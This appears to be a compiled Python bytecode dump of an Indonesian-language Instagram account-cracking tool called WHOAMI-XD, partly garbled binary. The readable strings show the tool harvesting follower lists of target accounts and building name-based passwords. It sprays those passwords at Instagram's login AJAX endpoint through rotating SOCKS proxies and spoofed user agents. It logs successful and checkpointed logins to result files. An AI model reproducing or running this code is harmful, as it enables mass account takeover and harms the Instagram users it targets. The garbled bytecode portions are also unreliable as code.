o
    <&c+�  �                   @   s$  z&d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZW n e	y@ Z
 zede
� d�� W Y dZ
[
ndZ
[
ww d dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZzd dlZW n' e	y�   e�d� e�d� zd dlZW n e	y�   ed� Y nw Y nw d dlmZ d dlmZ d d	lmZ d d
lm Z! d dlm"Z# d dl$m%Z& d dlm'Z( d dl)m*Z+ d dl,m-Z. d dlmZ d d
lm Z  d dlmZ d d	lmZ/ d dlmZ0 d dl$m%Z% d dl1m2Z2 d dlm'Z3 d dlm'Z4 d dlmZ d dlmZ d dlmZ d dl,m-Z- d dl5m6Z6m7Z7m8Z8m9Z9m:Z: e� Z;e�<� �=d�Z>dZ?dZ@e�Ae�� �ZBdZCdZDg ZEdd� ZFze�Gd�jHZIeJdd��KeI� W n eL�yo Z
 z
e'd� W Y dZ
[
ndZ
[
ww eJdd��M� �N� ZIze�d � W n   Y eJd!d��M� �N� ZOd"ZPd#ZQd$ZRd%ZSd&ZTd'ZUd#ZVd(ZWd)ZXd)ZYd*ZZd+ZSd,ZRd-ZTd.ZUd/ZVd'ZWd)ZYd0Z[d1Z\d2Z]d+Z^d3Z_d,Z`d4Zad5Zbd6Zcd'Zdd7Zed8Zfd9Zgd:Zhd;Zid<Zjd=Zkd>Zld?Zmd@Zng g g g d g g dAgf\ZoapaqarasZtZuZve�w� ZxeJdBd��M� �N� ZydCdD� ZzdEdD� ZzdFdG� Z{dHdI� Z|dJdK� Z}dLdM� Z~zejZ�W n   ej�j�Z�Y dNdO� Z�e��  e�dD� dPdQ� Z�dRdS� Z�dTdU� Z�G dVdW� dW�Z�dXdY� Z�dZd[� Z�d\d]� Z�d^d_� Z�e��g d`��Z�e��g da��Z�e��g db��Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e��e�e�e�e�e�e�g�Z�e�e� e� e� e� e� e� e� e� Z�dcdd� Z�dedf� Z�dgdh� Z�didj� Z�e�dkk�rze��  W n ej�j��y
   edleS� dmeX� dn�� Y nw eF�  dS dS )o�    Nz
 [[1;35m>[0m] module z belum terinstallzpip install rich�   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�sleep)�datetime)�Tree)�Progress�SpinnerColumn�	BarColumn�
TextColumn�TimeElapsedColumnz%d-%b-%Y�   �
   z?https://www.instagram.com/accounts/login/?force_classic_login=&�https://www.instagram.comc                   C   s6   zt �d� W n   Y zt �d� W d S    Y d S )N�data�result)�os�mkdir� r   r   �/sdcard/run.py�folder7   s   r   zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wZGAGAL�rz[curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txtz
socks5.txtz[96;1mz[1;35mz[1;32mz[1;31mz[1;33mz[1;96mz[38;2;255;127;0;1mz[0mz[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100ma  Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)�sukseszua.txtc                   C   �   t �d� d S �N�clear�r   �systemr   r   r   r   r#   s   �   r#   c                   C   r!   r"   r$   r   r   r   r   r#   v   r&   c                 C   s0   | d D ]}t j�|� t j��  td� qd S )N�
g���Q��?)�sys�stdout�write�flushr   )ZkelilingZmaur   r   r   �jalanx   s   �r,   c                  C   sj   t �� } | j}d|  krdk rd}|S  d|  kr"dk r#d}|S  d|  kr0dk r1d}|S  d}|S )	N�   �   zGood Morning�   zGood Afternoon�   zGood Eveningz
Good Night)r   �now�hour)r1   �hoursZtimenowr   r   r   �waktu}   s   ���r4   c                   C   s    t �  ttdt� � dd�� d S )Nu�                                                                          
   ⠀        ⣀⣀⣤⣤⣶⣶⣶⣶⣦⣴⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣬⢿⣿⣿⣿⣿⣿⣿⡙⢿⣿⣿⣿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣷⡍⠻⢷⠿⢿⠿⢧⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣆⣰⣶⣆⣀⣾⣿⣿⣿⣿⣿⣿⣿⡿⠿⣥⣾⣿⡀⠀⠀⠀⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠘⠻⣿⣿⣿⣦⡀⠀⠀
⠀⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣏⣡⣼⣿⣦⣄⠘⢿⣿⣿⣿⣿⡄⠀
⠀⣬⣿⣃⢨⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⡷⠀
⠀⠹⣿⣽⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⡿⠛⠉⠉⠙⢿⣿⣿⣿⠁⠀
⠀⠀⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣽⣿⣿⣿⣇⠀⠀⠀⠀⢸⣿⣿⣿⠂⠀
⠀⠀⢹⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⣿⣿⣿⣿⣿⣿⣿⣶⠦⠀⣼⣿⣿⣿⣀⡀
⠀⢰⣧⣼⣿⣿⣿⠃⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⣆⢸⣿⣿⣿⣿⣿⠿⣷⣶⣶⡄⠈⣿⣿⣿⣸⣿
⠀⠘⣿⣿⡞⣿⡏⠀⠚⠛⠉⠙⣧⡀⠀⠀⠈⣦⣻⣾⣿⣿⣻⣿⢏⡴⠋⠁⠀⠀⠀⣿⣿⣿⣿⡿
⠀⠀⠙⢠⣷⢿⣧⠀⠀⢲⣿⣶⣿⣿⣦⡀⢀⣾⣿⣿⣿⣯⣟⣷⣯⣷⣶⣶⣾⣿⣦⣿⡏⣿⡔⠁
⠀⠀⢠⡼⣧⠘⡏⠀⠀⠀⠁⢹⣂⣤⣼⡿⢻⡟⠻⣿⣿⣿⣿⣹⠯⠖⣁⣿⣿⣿⠛⢻⢃⣿⠷⠀
⠀⠀⠀⢣⡨⠿⠉⠀⠀⠀⠀⣀⣈⠉⠁⠀⠀⠀⠀⢿⡃⢸⣿⣿⣿⣿⣿⣿⠋⠉⠀⠈⠾⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡿⠷⠖⠀⠀⠀⠀⢻⣿⣿⣿⣭⣿⣻⣿⣿⣶⡤⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣯⣇⠀⠀⠀⠀⣀⠀⠀⢸⣿⠇⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠘⣿⣿⣶⣦⣄⣉⠳⠤⣿⣾⣿⣿⣿⠿⣿⡿⢫⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠸⣿⡄⠈⠙⠛⠟⢿⠿⠏⠛⠉⠀⢠⣿⠁⡾⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⠀⠀⠹⣿⡓⠲⠤⠀⠀⢀⡤⠴⠞⣻⣿⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠢⠀⠀⠹⣷⣄⡀⡀⣀⢠⢠⣶⣷⡿⠃⠀⢀⢰⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠈⢆⠀⠈⢿⣿⣶⣾⣿⣿⣿⡿⠀⠀⢀⡏⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠘⣆⠀⢀⡈⣻⣿⣿⣿⣷⣦⡀⠀⣾⠇⣼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠘⣆⠀⠙⠛⠛⣻⠿⣿⣿⠇⣼⡟⣲⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠘⢦⣀⣀⣴⣧⣴⣿⣟⣼⣿⡷⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⣈⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣟⡛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠁⠀⠀⠀⠀⠀⠀
                                                    
z	WHOAMI-XD)�titleZsubtitle)r#   �cetak�nelr4   r   r   r   r   �banner�   s   �r8   c                  C   sv   g d�} t d�D ],}t�d� tj�dt� dt� dt� dt� dt� d	�| |t| �   d
 � tj�	�  qt
d� d S )N)
u+   [[1;91m■[0m□□□□□□□□□]u+   [[1;92m■■[0m□□□□□□□□]u+   [[1;93m■■■[0m□□□□□□□]u+   [[1;94m■■■■[0m□□□□□□]u+   [[1;95m■■■■■[0m□□□□□]u+   [[1;96m■■■■■■[0m□□□□]u+   [[1;97m■■■■■■■[0m□□□]u+   [[1;98m■■■■■■■■[0m□□]u+   [[1;99m■■■■■■■■■[0m□]u,   [[1;910m■■■■■■■■■■[0m]�2   g�������?� �[�   •�] zHarap Tunggu...� z[0m � )�range�timer   r(   r)   r*   �N�H�lenr+   r	   )Z	animation�ir   r   r   �loading�   s   
@rF   c                  C   s�   t t�� �t t�� � } d�| �}t�  t�  td� td| � td� z:t�	d�j
}||v rIttd�� t�d� t t�� �}t�d� W d S ttd	�� t�d
� t�d� t��  W d S    t��  tdkrutt� t�  Y d S Y d S )N�|u�   [1;92m╭────────────────────────────────────────────╮u.   [1;97m [[1;91m•[1;97m][1;93m  YOUR ID : u�   [1;92m╰────────────────────────────────────────────╯z8https://github.com/WHOAMI-XD-KING/WXK/blob/main/user.txtuB   [1;97m [[1;92m•[1;97m][1;97m  YOUR ID IS ACTIVE........[97mz2xdg-open https://chat.whatsapp.com/+23479150936979r   ur   [1;97m [[1;91m•[1;97m][1;93m YOUR ID IS NOT ACTIVE SEND MESSAGE ON WHATSAPP FREE USER PLEASE DONT INBOX[97mz%xdg-open https://wa.me/+2349150936979�__main__)�strr   �geteuid�getlogin�joinr#   r8   r	   �requests�get�textr6   r7   r%   rA   r   r(   �exit�name�logo�chk)�uuid�idZhttpCaht�msgr   r   r   rS   �   s2   




�rS   c           	   	   C   s�   t dd��� }z9tjd| d| itdd�d�}|�� d d	 }|d
 }|d d }|d d }t�|� d|� d|� �� W t|fS  tt	fyn   d}t
|dd�}t� �|� t�d� t�d� t�d� t�  Y t|fS w )N�	.usernamer   �Bhttps://i.instagram.com/api/v1/users/web_profile_info/?username=%s�cookie�936619743392459��
user-agent�x-ig-app-id��cookies�headersr   �user�	full_name�edge_followed_by�count�edge_followrG   z# Instagram Checkpoint�red�Zstyler-   �
.kukis.log)�open�read�srN   �USN�json�external�append�
ValueError�KeyError�mark�solr	   rA   r   r   �removerP   )	rY   ra   �crE   �nama�	followers�	following�wel�wel2r   r   r   �cekAPI�   s&   	�


�r{   c                  C   s4  dt v r�z	tdd��� } W ns ty�   t�  td� ttd�� tdt	� dt
� dt	� d	t� ��}|d
krwttd�� tdt	� dt
� dt	� dt� ��}tdt	� dt
� dt	� dt� ��}t�  tdd��|�} tdd��|�}t�  t�d� n|dkr~t�  Y nw t| �\}}d| i}t|||���  d S t�  d S )Nr    rh   r   r?   z�[white][[red]01[white]] Login Menggunakan Cookie
[white][[red]02[white]] Login Menggunakan Username & Password [white]([red]Eror[white])�  r;   r<   �] Masukan Pilihan : �1u�   [white][[red]•[white]] Gunakan username dan cookies instagram untuk login.
[white][[red]•[white]] sebelum login pastikan akun bersifat publik bukan privat�] Masukan Username : z] Masukan Cookie : r   rW   �python run.py�2rY   )�	lisensikuri   rj   �FileNotFoundErrorr8   r	   r6   r7   �input�P�MrB   rF   r*   rP   r   r%   �loginr{   �	instagram�menu)ZkukiZloginpil�usZcokra   ZexrY   r   r   r   �ANJIM�   s0      ��
r�   c               	   C   s0  z)t td�� tdt� dt� dt� dt� ��} tjt� dt� dt� dt� �d�}W n ty9   t	d� t
�  Y nw t| |��� }|�d	�d
krstdd��| � tdd��|�d�� d|�d�i}t	dt� dt� �� t�d� d S |�d	�dkr�t	dt� dt� �� t�  d S t	dt� dt� �� t�  d S )Nu�   [white][[red]•[white]] Gunakan username dan password instagram untuk login.
[white][[red]•[white]] sebelum login pastikan akun bersifat publik bukan privatr|   r;   r<   z] Masukan username: z] Masukan password: )�promptz0{M} KeyboardInterrupt terdeteksi... keluar{N}!!!�status�successrW   �arh   rY   z
 z nice Login berhasilr�   �
checkpoint�	zlogin check pointr>   z0user name atau passboard yang anda masukan salah)r6   r7   r�   r�   r�   rB   �	stdiomaskZgetpass�KeyboardInterruptr	   rP   ZinstagramAPIZloginAPIrN   ri   r*   rC   r   r%   r�   )r�   �pw�xrY   r   r   r   r�   	  s(    &
�

r�   c                   @   s~   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zddd�Zdd� Zdd� Zdd� Zdd� ZdS ) r�   c                 C   s    || _ || _|| _t�� | _d S )N)Zext�usernamerY   rM   �Sessionrk   )�selfrn   r�   rY   r   r   r   �__init__"  s   zinstagram.__init__c                 C   s�   t D ]J}z|�d�d }|�d�d }|�d�d }W n   Y t�  td� ttdt� d|� dt� d	| j� dt� d
|� dt� d|� ��� ttd�� qd S )NrG   r   r   �   r?   u   [green][[white]•[green]] zSelamat Datang : u   
[green][[white]•[green]] zUsername       : zFollowers      : zFollowing      : a  [green][[white]01[green]] Crack From Search
[green][[white]02[green]] Crack From followers
[green][[white]03[green]] Crack from following
[green][[white]04[green]] Check Status Crack 
[green][[white]05[green]] Lihat Hasil Crack
[green][[white]06[green]][red] Exit)rn   �splitr8   r	   r6   r7   rC   r�   )r�   rE   rv   rw   rx   r   r   r   rR   (  s   >�zinstagram.logoc              	   C   sl   t dt� dt� dt� dt� ��}|dv r%t�d� t�d� t�d� d S |d	v r0t�d� d S | ��  d S )
Nr|   r;   r<   z ] Apakah Yakin Mau Logut  y/t : ��y�Yrh   rW   r�   ��t�T)r�   r�   r�   �Cr   rt   r%   �Exit)r�   r�   r   r   r   r�   6  s    

zinstagram.Exitc                 C   s>   d| d }t �|�}|�� }t|d d �d��d��}|S )NzFhttps://www.instagram.com/web/search/topsearch/?context=blended&query=z&&rank_token=0.3613812772602163&count=1�usersr   ra   Zpk)rM   rN   rm   rI   )r�   Zsix_id�urlr�   �x_jasonZuidr   r   r   �sixAPIB  s
   
zinstagram.sixAPIc              	   C   s�   t d�}| jjddt� id�j}t�dt|��d }tj�	ddd	d
dt� d�� t
�||||d��}d�| � d�tj�|��| _tjd| | j|d�jS )NT�https://www.instagram.com/r\   �r`   z'{"config":{"csrf_token":"(.*)","viewer"r   �close�*/*�!application/x-www-form-urlencodedz
$Version=1zen-US)Z
ConnectionZAcceptzContent-typeZCookie2zAccept-Languagez
User-Agent)Z_uuidZ_uid�user_idZ
_csrftokenz&signed_body={}.{}&ig_sig_key_version=4Fz6https://i.instagram.com/api/v1/friendships/destroy/%s/)r_   )ZgenerateUUIDrk   rN   Z
User_Agent�content�re�findallrI   r`   �updaterm   �dumps�format�urllibZrequest�quoteZpayload�postrO   )r�   r�   Zusername_idrY   rT   �xx�	crf_tokenr   r   r   r   �unfollowAPIJ  s(   ��
�zinstagram.unfollowAPIc           	   	   C   s�   z2t jd| |dtid�}t�|j�}|d D ]}|d }|d }|d }t�|� d|� �� qW tS  tj	j
yI   td	t� d
t� d�� Y tS w )Nz�https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rrank_token=0.35875757839675004&include_reel=truer\   r^   r�   ra   r�   rb   rG   �
 [�!�] Koneksi internet bermasalah)rk   rN   rl   rm   �loadsrO   �internalro   rM   �
exceptions�ConnectionErrorrP   r�   r�   )	r�   rY   rv   r�   r�   rE   ra   r�   �fullnamer   r   r   �	searchAPI^  s   ���zinstagram.searchAPIc              
   C   s�   dt v rSztjd| |tdd�d�}|�� d d }|d }W |S  tjjy6   td	t	� d
t
� �� Y |S  tyR } ztd	t	� dt
� �� W Y d }~|S d }~ww t�  d S )Nr    rX   rZ   r[   r^   r   ra   rU   r'   z[!] Koneksi internet bermasalahzO[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik)r�   rk   rN   rl   rm   rM   r�   r�   rP   r�   r�   �	Exception�lisensi)r�   rY   rU   �mZm_jason�idx�er   r   r   �idAPIl  s   
����
zinstagram.idAPIc              
   C   s�  dt v r�z�tdt� dt� dt� d�� tj|| |dtid�}t�|j	�}|d D ]}|d	 }|d
 }t
�|� d|� �� t�|� q)dtv r�|d }	td�D ]S}
tjd| d |	 |dtid�}t�|j	�}z.|d D ]}|d	 }|d
 }t
�|� d|� �� t�|� qlz|d }	W n   Y W  nW qO   d|j	v r�Y  nY qOW t
S W t
S W t
S 	 W t
S  tjjy�   tdt� �� Y t
S  ty� } ztdt� �� W Y d }~t
S d }~ww t�  d S )Nr    r|   r;   r<   z!] Tungu Sedang Mengumpulkan Id...r\   r^   r�   r�   rb   rG   �pengikutZnext_max_idi'  z+https://i.instagram.com/api/v1/friendships/z/followers/?count=100&max_id=Z	challengez
>> Koneksi Internet Bermasalahz.>> Username Yang Anda Masukan Tidak Di Temukan)r�   r	   r�   r�   rk   rN   rl   rm   r�   rO   r�   ro   rx   �menudumpr@   rM   r�   r�   rP   r�   r�   r�   )r�   rY   �apirU   r�   r�   rE   r�   rv   Zmaxid�zr�   r   r   r   �infoAPIz  s\    �
��������
zinstagram.infoAPIc                 C   s  t dt� dt� dt� dt� tt�� t� �
� ttddd�� t	dt� dt� dt� dt� ��}|d	kr:| �
||� d S |d
krF| �
||� d S |dkrR| �
||� d S |dkr^| �
||� d S |dkr�t d� t t� d�� t d� t	dt� dt� ��}| �
|||� d S | �|� d S )Nr|   r;   r<   z] Total Id : z�[green][[white]01[green]] Metode Cepat
[green][[white]02[green]] Metode (OK only)
[green][[white]03[green]] Metode Cepet (CP Only)
[green][[white]04[green]] Metode 2 (CP OnlyZMETHOD�r5   r}   r~   r�   �3�7�4zpaswoard manualz) Contoh sayang,anjing,bangsat,kontol,babir?   z>> List Password : r>   )r	   r�   r�   rC   rD   r�   rB   r6   r7   r�   �generateAPI�passwordAPI)r�   Zxnxru   �zxr   r   r   r�   �  s$   , zinstagram.passwordAPIr?   c                 C   s�  dt � dt � d�}t|dd�}tt|dd�� d}t|dd�}t� �|� td	d
���}|D ]�}	z�|	�d�d }
|	�d�d �� }|�d�D ]�}t	|�dk rOqF|�� }|dkrvt	|�dksit	|�dksit	|�dkrr|d |d g}n�|g}n�|dkr�t	|�dks�t	|�dks�t	|�dkr�|d ||d |d g}n�|d ||d |d g}nu|dkr�t	|�dks�t	|�dks�t	|�dkr�|d ||�� g}nU|d ||�� g}nK|dk�rt	|�dks�t	|�dks�t	|�dkr�|d |d |d |g}n'|d |d |d |�� g}n|dk�rt	|�dk�r|�
dd��d�}n n	|�| j|
|� qFW q.   Y q.W d   � n	1 �s6w   Y  td� d}t|dd�}t� �|� t�  d S )Nu#   [•] Hasil OK disimpan ke: result/u(   .txt
[•] Hasil CP disimpan ke: result/�.txt�
bold greenrg   zCRACK DIMULAIr�   uI   # [•] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detikr/   )�max_workersrG   r   r   r>   �   r~   r-   r   Z123Z1234r�   Z12345r�   r�   r�   r?   �,r'   z# CRACK SELESAIZyellow)�dayr7   r6   rr   rs   r	   r   r�   �lowerrD   �replaceZsubmit�crackAPIrP   )r�   ra   �or�   �io�oiZipkuZipku1ZshinkairE   r�   �passwordr   Zsandir   r   r   r�   �  s\   $$$
$
���&
zinstagram.generateAPIc                 C   sn   z,t jd| tdd�d�}|�� d d }|d }|d d	 }|d
 d	 }|d d	 }W n   Y ||||fS )NrX   rZ   r[   r�   r   ra   rb   rc   rd   re   Zedge_owner_to_timeline_media)rk   rN   rl   rm   )r�   ra   r�   r�   rv   r�   �mengikut�	postinganr   r   r   �APIinfo�  s   zinstagram.APIinfoc                 C   sb  t j�dt� dt� t� dtt�� t� dt� dtt	�� dt� dt� dtt
�� dt� d	��t j�� f �z�|D �]�}t�t�}t�t�}d
d| i}d}t�g d��}d}	t�g d��}
t�dd�}t�g d��}d}t�dd�}d}t�dd�}t�dd�}d}|� d	|� d|	� |
� |� |� d|� |� d|� d|� d|� d	|� �}t�d�}i dd �d!d�d"d#�d$d%�d&d'�d(d)�d*d+�d,|�d-|jd. �d/d0�d1d2�d3d4�d5d6�d7d8�d9d�d:d;�d<d=�}d>|� d?|� �|d@dAdBdAdC�}tjdD|||dE�}t�|j�}dFt|�v �rS| �|�\}}}}dG|� dH|� dI|� dJ|� dK|� dL|� dM|� �}t|dNdO�}tdP� tt|dQdR�� tdSt � dT�dU��|� dV|� dV|� dV|� dP�� t	�!|�  n�dWt|�v �r�| �|�\}}}}dG|� dH|� dI|� dJ|� dK|� dL|� dM|� �}tdP� t|dXdO�}tt|dYdR�� tdZt � dT�dU��|� dV|� dV|� dV|� dP�� t
�!|�  nsd[t|j�v �r�t j�d\t"� d]t� dt"� d^t� �� t j��  t#d_� q5d`t|j�v �r�t j�d\t"� d]t� dt"� dat� �� t j��  t#d_� | �$||� q5dbt|j�v �rt j�d\t"� d]t� dt"� dct� �� t j��  t#d_� q5q5td7 aW d S    | �$||� Y d S )dN�z[JEWEL-XD] [�/r=   z[ OK : �]r|   z[ CP : r>   �httpz	socks5://zMozilla/5.0 (Linux; Android 11;)	r�   �5�6r�   �8�9Z10Z11Z12zCPH1911 Build/RP1A.200720.011))�A�Br�   �D�E�F�GrC   �I�J�K�Lr�   rB   �Or�   �Q�R�Sr�   �U�V�W�Xr�   �Zr   i�  z;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �.z@https://www.instagram.com/accounts/login/?next=/accounts/logout/ZHost�www.instagram.com�x-ig-www-claim�x-instagram-ajaxZb2301ddcf964�content-typer�   �acceptr�   �x-requested-with�XMLHttpRequestz	x-asbd-idZ198387r\   �x-csrftokenZ	csrftokenr]   rZ   �originr   �sec-fetch-site�same-origin�sec-fetch-mode�cors�sec-fetch-dest�empty�refererzaccept-encodingzgzip, deflate�accept-languagez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7z#PWD_INSTAGRAM_BROWSER:0:�:Zfalsez{}r?   )�enc_passwordr�   �optIntoOneTap�queryParams�stopDeletionNonce�trustedDeviceRecords�.https://www.instagram.com/accounts/login/ajax/)r`   r   Zproxies�userIdzName     : z
Username : z
Password : z
Followers : z
Following: z
Posts: z
User Agent: r�   rg   r'   zWHOAMI-XD-KINGr�   zresult/success-r�   r�   rG   �checkpoint_urlZwhitez	WHOAMI-CPzresult/checkpoint-�Please wait a few minutesu   ┣[r�   zAM SORRT IP GOT SPAMMED r   Zip_blockzPLEASE ON & OFF AIRPLANE MODE ZspamzYOUR IP IS SPAMMED )%r(   r)   r*   r�   r�   �looprD   r�   rC   r�   r�   r+   �calendarZtimegm�current_GMT�random�choice�proxZ	randrangerk   rN   r_   r�   rm   r�   rO   rI   r�   r7   r	   r6   ri   r�   ro   r�   r   r�   )r�   ra   Zpasr�   ZtsZnipZproxsZaa�bru   �dr�   �f�g�hrE   �j�k�l�uaku�tokenr`   �paramr�   r�   rQ   rw   rx   Zpostsr�   r�   r   r   r   r�   �  s�   b


B
��������
	�
���������.0
.0
868zinstagram.crackAPIc                 C   s�  �z�t jddtid�j}t�dt|��d }t j�dddd	d
td|dddddddd�� |d�	t
�dd�|�di di d�}t jd|d�}td� t�|j�}d|jv r�| �|�\}}	}
}tdt� dt� dt� d �� td�g t� �d!�t� �d"�t� �|� �d#�t� �d!�t� �d$�t� �|� �d#�t� �d!�t� �d%�t� �|� �d#�t� �d!�t� �d&�t� �|	� �d#�t� �d!�t� �d'�t� �|
� �d#�t� �d!�t� �d(�t� �|� �d#�t� �d)�t� �d*�t� �t� �t� ��� td#� W d S d+|jv �r�| �|�\}}	}
}tdt� dt� d,t� d-�� td�g t� �d!�t� �d"�t� �|� �d#�t� �d!�t� �d$�t� �|� �d#�t� �d!�t� �d%�t� �|� �d#�t� �d!�t� �d&�t� �|	� �d#�t� �d!�t� �d'�t� �|
� �d#�t� �d)�t� �d(�t� �|� �t� ��� td#� W d S d.t|j�v �r�tj�d/t� d0t� d1t� d2t� �� tj��  td3� | �||� W d S W d S    | �||� Y d S )4Nr�   r\   r�   z\"csrf_token\"\:\"(.*?)\"r   r  z5hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCTZ82a581bb9399r�   r�   r  rZ   r   r  r  r  zen-GB,en-US;q=0.9,en;q=0.8)Z	authorityr  r  r	  r
  r\   r  r  r]   r  r  r  r  r  r  z#PWD_INSTAGRAM_BROWSER:0:{}:{}i ʚ;l   �g�] Fr?   )r�   r  r  r  r  r  r  )r   r   r  r�   u	   ╭──z Successfullyz                             u	   ├──z Nama     : r'   � Username : � Password : � Pengikut : z Mengikuti: z Postingan: u	   ╰──z User Agent : r  z Check Pointz                       r   r:   r�   r=   z Please wait a few minutes secondr   )rk   rN   rl   r�   r�   r�   rI   r`   r�   r�   r$  Zrandintr�   r   rm   r�   rO   r�   r	   r�   rC   r�   rL   r/  r�   r(   r)   r*   r�   r+   �checkAPI)r�   ra   r�   r0  r�   r1  r�   r�   rv   r�   r�   r�   r   r   r   r5  P  s\   ��
� �6�zinstagram.checkAPIc                 C   s�  | � �  tdt� dt� dt� dt� ��}|dkr| ��  d S |dv rtttd�� ttdt� dt� dt� dt� ���}t	d� ttd	�� t
|�D ]$}|d
  tdt� dt� dt� dt� tt�� t� d��}| �| j|�}qH| �|� d S |dv r�t	d� tdt� dt� dt� dt� d�	�}|dv r�t| � d S |dv r�t| � d S |dv r�t	d� d S d S |dv r�t	d� td�}|dv r�t| � d S |dv r�t| � d S |dv r�t	d� d S d S |dv �rXt	d� t�d�D ]}t	dt� dt� d|� �� q�tdt� dt� dt� dt� ��}td| ��� �� }t	dt� dt� dt� dt� t|�� t� �
� t	dt� dt� d�� |D ]}|�d �d! }	|�d �d
 }
| �|	|
� �q4tdt� d"t� �� d S |d#v �r�t	d� t�d�D ]}t	dt� dt� d|� �� �qftdt� dt� dt� dt� ��}td| ��� �� }|�d$�}|d! }t	dt� d%t� t|�� t� d&�� |D �]}|�d �d! }	|�d �d
 }
|�d �d' }|�d �d( }|d)k�rHt	d� g d*�t� �d+�t� �d�t� �d,�t� �d-�t� �d.�t� �d/�t!� �|	� �t� �d0�t� �d.�t� �d1�t!� �|
� �t� �d0�t� �d.�t� �d2�t!� �|� �t� �d0�t� �d.�t� �d3�t!� �|� �t� �d4��� t"d5� �q�t	d� g d0�t� �d6�t� �t� �d7�t� �d0�t� �d6�t� �t� �d8�t� �|	� �t� �d0�t� �d6�t� �t� �d9�t� �|
� �t� �d0�t� �d6�t� �t� �d:�t� �|� �t� �d0�t� �d6�t� �t� �d;�t� �|� �t� �d<��� t"d5� �q�d S |d=v �r�| �#�  d S t�  d S )>Nr|   r;   r<   z
